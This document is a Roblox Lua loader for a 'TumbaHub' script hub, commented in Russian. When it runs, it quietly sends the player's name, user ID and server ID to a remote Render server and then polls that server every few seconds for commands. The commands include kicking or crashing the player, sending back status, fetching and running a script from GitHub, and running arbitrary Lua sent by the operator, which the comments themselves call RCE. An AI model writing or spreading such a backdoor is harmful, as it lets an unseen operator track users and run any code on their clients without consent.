-- === TELEGRAM BOT NOTIFIER (Отправка инфы на сервер) ===
task.spawn(function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    -- ВАЖНО: Вставь сюда свою ссылку из Render!
    local SERVER_URL = "https://tubmahub-server.onrender.com/api/log_user" 

    local userData = {
        username = LocalPlayer.Name,
        userId = LocalPlayer.UserId,
        jobId = game.JobId
    }

    local requestFunc = request or http_request or (syn and syn.request) or (http and http.request)
    
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = SERVER_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(userData)
            })
        end)
        
        -- === СИСТЕМА ПИНГА (HEARTBEAT) ===
        -- Клиент каждые 30 секунд сообщает серверу, что он жив
        task.spawn(function()
            while task.wait(30) do
                pcall(function()
                    local safeUsername = HttpService:UrlEncode(LocalPlayer.Name)
                    requestFunc({
                        Url = "https://tubmahub-server.onrender.com/api/ping?username=" .. safeUsername,
                        Method = "GET"
                    })
                end)
            end
        end)
        -- ==================================
            
        -- === ЦИКЛ ПОЛУЧЕНИЯ КОМАНД ===
        while task.wait(5) do -- Запрашиваем команды каждые 5 секунд
            local success, result = pcall(function()
                local safeUsername = HttpService:UrlEncode(LocalPlayer.Name)
                return requestFunc({
                    Url = "https://tubmahub-server.onrender.com/api/get_command?username=" .. safeUsername,
                    Method = "GET"
                })
            end)

            if success and result and result.Body then
                -- Пытаемся расшифровать JSON ответ от сервера
                local decodeSuccess, data = pcall(function()
                    return HttpService:JSONDecode(result.Body)
                end)
                
                -- Если сервер ответил success и прислал команду
                if decodeSuccess and data and data.status == "success" and data.command then
                    local cmd = data.command
                    
                    -- === ИСПОЛНЕНИЕ КОМАНД ===
                    
                    -- 1. Обычный кик без причины
                    if cmd == "/kick" then
                        LocalPlayer:Kick("Вы были кикнуты администратором TumbaHub.")
                        
                    -- 2. Кик с кастомной причиной (ищем совпадение начала строки)
                    elseif string.find(cmd, "^/kick_") then
                        -- Вырезаем текст причины (все, что идет после 6-го символа "/kick_")
                        local customReason = string.sub(cmd, 7)
                        LocalPlayer:Kick(customReason)
                        
                    -- НОВОЕ: Проверка статуса
                    elseif cmd == "/check_status" then
                        local health = "N/A"
                        local maxHealth = "N/A"
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                            health = tostring(math.floor(LocalPlayer.Character.Humanoid.Health))
                            maxHealth = tostring(math.floor(LocalPlayer.Character.Humanoid.MaxHealth))
                        end
                        
                        local placeId = tostring(game.PlaceId)
                        
                        local statusText = string.format(
                            "📊 Статус игрока %s:\n- Здоровье: %s / %s\n- ID Локации: %s",
                            LocalPlayer.Name,
                            health,
                            maxHealth,
                            placeId
                        )
                        
                        pcall(requestFunc, {
                            Url = "https://tubmahub-server.onrender.com/api/send_message",
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({ text = statusText })
                        })
                        
                    -- 3. Краш клиента
                    elseif cmd == "/crash" then
                        while true do end 
                        
                    -- 4. Выполнение кастомного скрипта (RCE)
                    elseif string.find(cmd, "^/execute__") then
                        -- Вырезаем сам код (всё, что идет после 10-го символа "/execute__")
                        local codeToRun = string.sub(cmd, 11)
                        
                        -- Функция loadstring превращает текст в выполняемый код
                        local compiledFunc, compileError = loadstring(codeToRun)
                        
                        if compiledFunc then
                            -- Выполняем код в отдельном потоке, чтобы не застопорить лоадер
                            task.spawn(compiledFunc)
                        else
                            warn("TumbaHub: Ошибка компиляции скрипта: " .. tostring(compileError))
                        end
                        
                    -- 5. Сброс персонажа (Reset)
                    elseif cmd == "/reset" then
                        -- Скачиваем скрипт по твоей ссылке
                        local resetScript = game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/reset_player")
                        local resetFunc, err = loadstring(resetScript)
                        
                        if resetFunc then
                            task.spawn(resetFunc)
                        else
                            warn("TumbaHub: Не удалось загрузить скрипт reset_player: " .. tostring(err))
                        end

                    -- 6. Заморозка (Freeze)
                    elseif cmd == "/freeze" then
                        pcall(function()
                            local character = LocalPlayer.Character
                            if character and character:FindFirstChild("HumanoidRootPart") then
                                character.HumanoidRootPart.Anchored = true
                            end
                        end)
                        
                    -- 7. Разморозка (Unfreeze)
                    elseif cmd == "/unfreeze" then
                        pcall(function()
                            local character = LocalPlayer.Character
                            if character and character:FindFirstChild("HumanoidRootPart") then
                                character.HumanoidRootPart.Anchored = false
                            end
                        end)

                    -- Интеграция с модульным хабом
                    elseif Mega and Mega.Commands and Mega.Commands[cmd] then 
                        task.spawn(Mega.Commands[cmd], data)
                    end

                    -- =========================
                end -- Закрывает проверку decodeSuccess
            end -- Закрывает проверку success
        end -- Закрывает цикл while task.wait
    end -- Закрывает проверку if requestFunc
end) -- Закрывает task.spawn(function()
-- ========================================================
